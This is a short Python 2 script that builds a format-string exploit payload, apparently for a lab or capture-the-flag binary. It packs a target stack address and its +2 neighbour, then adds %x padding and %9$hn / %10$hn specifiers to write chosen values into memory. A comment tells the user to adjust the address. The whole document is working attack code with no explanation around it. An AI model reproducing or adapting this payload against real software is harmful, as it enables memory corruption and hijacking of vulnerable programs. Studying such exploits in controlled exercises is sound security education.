import struct

OFFSET = 9
CHECK = 0xbffffaf8  # change the address to fit the actual address

exploit = ""
exploit += struct.pack("I", CHECK)
exploit += struct.pack("I", CHECK + 2)
exploit += '%48871x'
exploit += '%9$hn'
exploit += '%73662x'
exploit += '%10$hn'

print exploit
